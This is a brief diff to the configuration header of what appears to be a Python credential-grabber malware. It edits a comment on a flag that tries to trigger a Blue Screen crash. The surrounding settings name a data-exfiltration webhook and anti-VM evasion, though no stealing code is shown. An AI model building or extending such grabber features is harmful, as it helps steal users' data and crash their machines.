@@ -3,7 +3,7 @@
 WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"
 PINGME = True
 VMPROTECT = True
-BSOD = False #Tries to trigger Blue Screen if grabber fails in VM (Only works if VMPROTECT is enabled)
+BSOD = False #Tries to trigger Blue Screen if grabber fails
 
 import os
 if os.name!='nt':
